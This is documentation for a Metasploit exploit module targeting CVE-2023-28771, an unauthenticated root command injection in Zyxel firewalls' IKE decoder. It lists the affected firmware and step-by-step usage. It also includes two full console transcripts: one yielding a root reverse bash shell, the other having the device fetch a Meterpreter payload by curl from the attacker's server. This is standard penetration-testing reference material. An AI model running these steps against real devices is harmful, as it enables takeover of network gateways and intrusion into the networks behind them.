## Vulnerable Application
This module exploits a remote unauthenticated command injection vulnerability in the Internet Key Exchange
(IKE) packet decoder over UDP port 500 on the WAN interface of several Zyxel devices. The affected devices are
as follows:

* ATP (Firmware version 4.60 to 5.35 inclusive)
* USG FLEX (Firmware version 4.60 to 5.35 inclusive),
* VPN (Firmware version 4.60 to 5.35 inclusive)
* ZyWALL/USG (Firmware version 4.60 to 4.73 inclusive).

The affected devices are vulnerable in a default configuration and command execution is with root privileges. For a
full technical analysis of the vulnerability read the
[Rapid7 AttackerKB Analysis](https://attackerkb.com/topics/N3i8dxpFKS/cve-2023-28771/rapid7-analysis).

## Testing
A physical device is required for testing. The device must be running a vulnerable firmware version prior to the
vendor patch. A Zyxel USG FLEX 100 device was used during development and testing of this Metasploit module.

The attacker must be able to send UDP data to port 500 on the WAN interface of the affected network device.

## Verification Steps
1. Start msfconsole
2. `use exploit/linux/misc/zyxel_ike_decoder_rce_cve_2023_28771`
3. `set RHOST <TARGET_WAN_IP>`
4. `set LHOST eth0`
5. `check`
6. `exploit`
7. The default target `0` is a `cmd/unix/reverse_bash` payload. A root command shell session should be created.

## Scenarios

### Linux Command (Zyxel USG FLEX 100)
```
msf6 > use exploit/linux/misc/zyxel_ike_decoder_rce_cve_2023_28771
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set RHOST 192.168.86.40
RHOST => 192.168.86.40
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set LHOST eth0
LHOST => eth0
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > show options

Module options (exploit/linux/misc/zyxel_ike_decoder_rce_cve_2023_28771):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.86.40    yes       The target host(s), see https://docs.me
                                       tasploit.com/docs/using-metasploit/basi
                                       cs/using-metasploit.html
   RPORT    500              yes       The target port (UDP)
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (defau
                                       lt is randomly generated)
   URIPATH                   no        The URI to use for this exploit (defaul
                                       t is random)


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to
                                       listen on. This must be an address on t
                                       he local machine or 0.0.0.0 to listen o
                                       n all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  eth0             yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux Command



View the full module info with the info, or info -d command.

msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > check
[*] 192.168.86.40:500 - The service is running, but could not be validated. IKE detected but device vendor and service version are unknown.
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Command shell session 1 opened (192.168.86.42:4444 -> 192.168.86.40:42973) at 2023-05-22 17:34:41 +0100

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux usgflex100 3.10.87-rt80-Cavium-Octeon #2 SMP Tue Jan 4 18:13:49 CST 2022 mips64 Cavium Octeon III V0.2 FPU V0.0 ROUTER7000_REF (CN7020p1.2-1200-AAP) GNU/Linux
exit
[*] 192.168.86.40 - Command shell session 1 closed.
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > 
```

### Linux Dropper (Zyxel USG FLEX 100)
```
msf6 > use exploit/linux/misc/zyxel_ike_decoder_rce_cve_2023_28771
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set TARGET 1
TARGET => 1
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set PAYLOAD linux/mips64/meterpreter_reverse_tcp
PAYLOAD => linux/mips64/meterpreter_reverse_tcp
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set RHOST 192.168.86.40
RHOST => 192.168.86.40
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set LHOST eth0
LHOST => eth0
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set SRVHOST eth0
SRVHOST => 192.168.86.42
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > show options

Module options (exploit/linux/misc/zyxel_ike_decoder_rce_cve_2023_28771):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.86.40    yes       The target host(s), see https://docs.me
                                       tasploit.com/docs/using-metasploit/basi
                                       cs/using-metasploit.html
   RPORT    500              yes       The target port (UDP)
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (defau
                                       lt is randomly generated)
   URIPATH                   no        The URI to use for this exploit (defaul
                                       t is random)


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  192.168.86.42    yes       The local host or network interface to
                                       listen on. This must be an address on t
                                       he local machine or 0.0.0.0 to listen o
                                       n all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/mips64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  eth0             yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper



View the full module info with the info, or info -d command.

msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > check
[*] 192.168.86.40:500 - The service is running, but could not be validated. IKE detected but device vendor and service version are unknown.
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Using URL: http://192.168.86.42:8080/FbXB7q
[*] Client 192.168.86.40 (curl/7.70.0) requested /FbXB7q
[*] Sending payload to 192.168.86.40 (curl/7.70.0)
[*] Meterpreter session 1 opened (192.168.86.42:4444 -> 192.168.86.40:42976) at 2023-05-22 17:36:49 +0100
[*] Command Stager progress - 100.00% done (112/112 bytes)
[*] Server stopped.

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.86.40
OS           :  (Linux 3.10.87-rt80-Cavium-Octeon)
Architecture : mips64
BuildTuple   : mips64-linux-muslsf
Meterpreter  : mips64/linux
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.86.40 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > 
```
